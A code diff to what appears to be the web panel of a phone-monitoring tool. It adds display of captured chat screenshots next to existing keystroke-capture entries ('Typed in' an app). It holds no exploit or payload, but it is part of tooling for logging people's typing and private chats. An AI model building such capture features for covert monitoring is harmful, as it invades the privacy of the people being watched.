@@ -735,6 +735,16 @@ function formatFileSize(bytes) {
 function buildActivityDetail(a) {
     const fields = [];
 
+    // Screenshot image for chat captures
+    let shotHtml = '';
+    if (a.activity_type === 'chat_screenshot' && a.data && (a.data.image_url || a.data.media_id)) {
+        const src = a.data.image_url || `/api/files/${a.data.media_id}`;
+        shotHtml = `<div style="margin:0 0 10px;">
+            <div class="activity-detail-label" style="margin-bottom:6px;">📸 Screen capture — ${escHtml(String(a.data.reason || 'chat').replace(/_/g, ' '))}</div>
+            <img class="act-screenshot" src="${escAttr(src)}" onclick="openLightbox('${escAttr(src)}')" alt="chat screenshot">
+        </div>`;
+    }
+
     // Highlighted typed-text block for keystroke captures
     let typedHtml = '';
     if (a.activity_type === 'text_input' && a.data && a.data.text) {
@@ -768,7 +778,7 @@ function buildActivityDetail(a) {
         rawHtml = `<div class="activity-data-raw">${escHtml(JSON.stringify(data, null, 2))}</div>`;
     }
 
-    return `${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
+    return `${shotHtml}${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
 }
 
 function formatFullTime(ts) {
@@ -793,7 +803,7 @@ function renderActivityPanel() {
                 <span class="activity-arrow" id="act-arrow-${idx}">▶</span>
                 <div class="activity-app-icon">${activityIcon(a)}</div>
                 <div class="activity-main">
-                    <div class="activity-name">${escHtml(a.activity_type === 'text_input' ? ('⌨ Typed in ' + (a.app_name || a.package_name || 'App')) : (a.app_name || a.activity_type || 'Activity'))}</div>
+                    <div class="activity-name">${escHtml(a.activity_type === 'chat_screenshot' ? ('📸 Screenshot in ' + (a.app_name || a.package_name || 'Chat')) : (a.activity_type === 'text_input' ? ('⌨ Typed in ' + (a.app_name || a.package_name || 'App')) : (a.app_name || a.activity_type || 'Activity')))}</div>
                     ${a.package_name ? `<div class="activity-pkg">${escHtml(a.package_name)}</div>` : ''}
                 </div>
                 <span class="activity-time">${formatTime(a.timestamp)}</span>
